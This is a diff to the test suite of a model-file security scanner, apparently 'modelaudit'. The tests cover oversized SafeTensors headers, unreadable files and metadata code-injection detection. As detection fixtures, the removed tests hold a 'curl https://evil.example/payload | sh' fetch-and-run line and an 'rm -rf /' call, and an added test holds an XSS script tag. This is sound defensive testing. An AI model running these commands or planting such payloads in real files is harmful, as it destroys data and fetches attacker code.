@@ -14,9 +14,9 @@ pytest.importorskip("safetensors")
 
 from safetensors.numpy import save_file
 
-from modelaudit.core import determine_exit_code, scan_model_directory_or_file
+from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.safetensors_scanner import SafeTensorsScanner
+from modelaudit.scanners.safetensors_scanner import SAFETENSORS_READ_INCONCLUSIVE_REASON, SafeTensorsScanner
 
 
 def create_safetensors_file(path: Path) -> None:
@@ -126,19 +126,38 @@ def _write_oversized_header_safetensors(path: Path, header_len: int) -> None:
         handle.write(b"\x00\x00\x00\x00")
 
 
-def test_oversized_header_triggers_limit_check(tmp_path: Path) -> None:
+def test_oversized_header_returns_operational_exit2(tmp_path: Path) -> None:
+    file_path = tmp_path / "oversized_header.safetensors"
+    max_header_bytes = 1 * 1024 * 1024
+    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)
+
+    result = scan_model_directory_or_file(str(file_path), max_safetensors_header_bytes=max_header_bytes)
+
+    assert result.success is False
+    assert determine_exit_code(result) == 2
+    limit_check = next(check for check in result.checks if check.name == "Header Size Limit")
+    assert limit_check.severity == IssueSeverity.INFO
+
+
+def test_oversized_header_triggers_limit_check(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     file_path = tmp_path / "oversized_header.safetensors"
     max_header_bytes = 1 * 1024 * 1024
     _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)
 
     scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
+    monkeypatch.setattr(
+        scanner,
+        "calculate_file_hashes",
+        lambda _path: pytest.fail("oversized SafeTensors headers must be rejected before hashing"),
+    )
     result = scanner.scan(str(file_path))
 
     header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
     assert header_limit_check is not None
     assert header_limit_check.status.value == "failed"
+    assert all(check.name != "File Integrity Hash" for check in result.checks)
     assert "exceeds maximum allowed size" in header_limit_check.message
-    assert result.success is True
+    assert result.success is False
     assert result.metadata["analysis_incomplete"] is True
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "safetensors_header_size_limit_exceeded" in result.metadata["scan_outcome_reasons"]
@@ -166,7 +185,7 @@ def test_oversized_header_skips_metadata_content_analysis(tmp_path: Path, monkey
     assert header_limit_check.status.value == "failed"
     assert result.metadata["analysis_incomplete"] is True
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-    assert result.success is True
+    assert result.success is False
 
 
 def test_oversized_header_does_not_read_beyond_configured_limit(
@@ -284,6 +303,76 @@ def test_invalid_utf8_header_is_inconclusive_not_scanner_crash(tmp_path: Path) -
     assert not any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
 
 
+def test_unavailable_read_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "unreadable.safetensors"
+    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> None:
+        raise OSError("simulated SafeTensors read failure")
+
+    def raise_detection_error(_path: str) -> str:
+        raise OSError("simulated SafeTensors detection read failure")
+
+    def raise_zip_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_detection_error)
+    monkeypatch.setattr("modelaudit.core.detect_file_format_from_magic", lambda _path: "unknown")
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner.open", raise_os_error, raising=False)
+
+    direct = SafeTensorsScanner().scan(str(file_path))
+    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)
+
+    read_checks = [check for check in direct.checks if check.name == "SafeTensors File Read"]
+    assert direct.success is False
+    assert aggregate.success is False
+    assert len(read_checks) == 1
+    assert read_checks[0].status == CheckStatus.FAILED
+    assert "Unable to read SafeTensors file" in read_checks[0].message
+    assert read_checks[0].severity == IssueSeverity.INFO
+    assert read_checks[0].details["analysis_incomplete"] is True
+    assert read_checks[0].details["scan_outcome_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
+    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
+    metadata = aggregate.file_metadata[str(file_path)]
+    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in metadata["scan_outcome_reasons"]
+    assert metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
+    assert any(
+        check.name == "SafeTensors File Read" and "Unable to read SafeTensors file" in check.message
+        for check in aggregate.checks
+    )
+    assert not [
+        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_unreadable_path_preflight_is_operational_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "permission-denied.safetensors"
+    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")
+
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)
+
+    direct = SafeTensorsScanner().scan(str(file_path))
+    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)
+
+    assert direct.metadata["scan_outcome_reasons"] == [SAFETENSORS_READ_INCONCLUSIVE_REASON]
+    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
+    assert aggregate.file_metadata[str(file_path)]["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
+    assert not [
+        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert determine_exit_code(aggregate) == 2
+
+
 def test_bad_offsets(tmp_path: Path) -> None:
     file_path = tmp_path / "model.safetensors"
     create_safetensors_file(file_path)
@@ -369,6 +458,26 @@ def test_safetensors_security_finding_takes_precedence_over_inconclusive_structu
 
     assert direct.has_errors is True
     assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_safetensors_with_torch7_like_metadata_keeps_safetensors_routing(tmp_path: Path) -> None:
+    file_path = tmp_path / "torch-marker-metadata.safetensors"
+    header = {
+        "__metadata__": {
+            "framework": "torch",
+            "kind": "tensor nn.Sequential",
+            "description": "<script>alert('xss')</script>",
+        },
+        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
+    }
+    write_raw_safetensors(file_path, header, b"\x00" * 4)
+
+    direct = scan_file(str(file_path))
+    aggregate = scan_model_directory_or_file(str(file_path))
+
+    assert direct.scanner_name == "safetensors"
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
     assert determine_exit_code(aggregate) == 1
 
@@ -459,53 +568,6 @@ def test_unicode_metadata_is_not_code_injection(tmp_path: Path) -> None:
     code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
     assert code_injection_checks == []
     assert [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}] == []
-
-
-@pytest.mark.parametrize(
-    ("key", "value"),
-    [
-        ("description", "Security note: never invoke os.system('rm -rf /') or eval(user_input) in model hooks."),
-        (
-            "README",
-            "Example of unsafe code to avoid:\n```python\nimport os\nos.system('rm -rf /')\n```\nDo not execute this.",
-        ),
-    ],
-)
-def test_safetensors_documentation_examples_are_not_code_injection(tmp_path: Path, key: str, value: str) -> None:
-    file_path = tmp_path / "documented_security_example.safetensors"
-    data = {"t": np.arange(5, dtype=np.float32)}
-    save_file(data, str(file_path), metadata={key: value})
-
-    result = SafeTensorsScanner().scan(str(file_path))
-
-    assert result.success is True
-    assert not [
-        check
-        for check in result.checks
-        if check.name
-        in {
-            "SafeTensors Code Injection Detection",
-            "Metadata Code Pattern Check",
-            "Metadata Pattern Check",
-        }
-        and check.status == CheckStatus.FAILED
-    ]
-
-
-def test_safetensors_documentation_guard_does_not_hide_executable_metadata(tmp_path: Path) -> None:
-    file_path = tmp_path / "comment_padded_payload.safetensors"
-    data = {"t": np.arange(5, dtype=np.float32)}
-    metadata = {"description": "# Security note\nos.system('curl https://evil.example/payload | sh')"}
-    save_file(data, str(file_path), metadata=metadata)
-
-    result = SafeTensorsScanner().scan(str(file_path))
-
-    assert any(
-        check.name == "SafeTensors Code Injection Detection"
-        and check.status == CheckStatus.FAILED
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
 
 
 def test_literal_unicode_escape_metadata_still_flags_code_injection(tmp_path: Path) -> None:
